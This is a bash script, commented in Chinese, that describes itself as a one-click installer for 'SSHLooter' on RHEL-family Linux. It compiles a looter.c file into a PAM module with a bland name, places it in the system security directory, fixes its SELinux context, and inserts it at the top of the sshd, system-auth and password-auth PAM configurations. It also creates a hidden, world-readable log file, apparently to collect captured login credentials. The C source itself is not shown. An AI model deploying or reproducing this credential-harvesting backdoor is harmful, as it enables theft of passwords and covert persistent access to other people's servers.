#!/bin/bash
echo "[+] SSHLooter 本地记录版 一键部署 - CentOS/RHEL/Rocky/AlmaLinux"

# 1. 检查并编译
if [ -f "looter.c" ]; then
    echo "[*] 正在编译 looter.c ..."
    gcc -fPIC -shared -o pam_auth1.so looter.c -lpam
    if [ $? -ne 0 ]; then
        echo "[-] 编译失败！请检查 looter.c"
        exit 1
    fi
    echo "[√] 编译成功 → pam_auth1.so"
else
    echo "[-] 未找到 looter.c 文件！"
    exit 1
fi

# 2. 复制模块
sudo cp pam_auth1.so /lib64/security/pam_auth1.so

# 3. SELinux 上下文修复
if command -v chcon >/dev/null 2>&1; then
    sudo chcon -t lib_t /lib64/security/pam_auth1.so 2>/dev/null || true
    echo "[*] 已应用 SELinux 上下文"
fi

# 4. 添加到关键 PAM 配置文件（RHEL 正确方式）
for pam_file in /etc/pam.d/system-auth /etc/pam.d/password-auth /etc/pam.d/sshd; do
    if [ -f "$pam_file" ]; then
        # 先备份
        sudo cp "$pam_file" "${pam_file}.bak.$(date +%Y%m%d-%H%M)"
        # 插入到最前面
        sudo sed -i '1i auth    optional    pam_auth1.so\naccount optional    pam_auth1.so' "$pam_file"
        echo "[√] 已添加到 $pam_file"
    fi
done

# 5. 设置权限和日志文件
sudo chmod 644 /lib64/security/pam_auth1.so
sudo touch /var/log/.auth1.log
sudo chmod 644 /var/log/.auth1.log
sudo chown root:root /var/log/.auth1.log

echo "[√] 部署完成！"
echo "    日志文件：/var/log/.auth1.log"
echo "    查看命令：tail -f /var/log/.auth1.log"
echo "    备份文件已创建（.bak）"
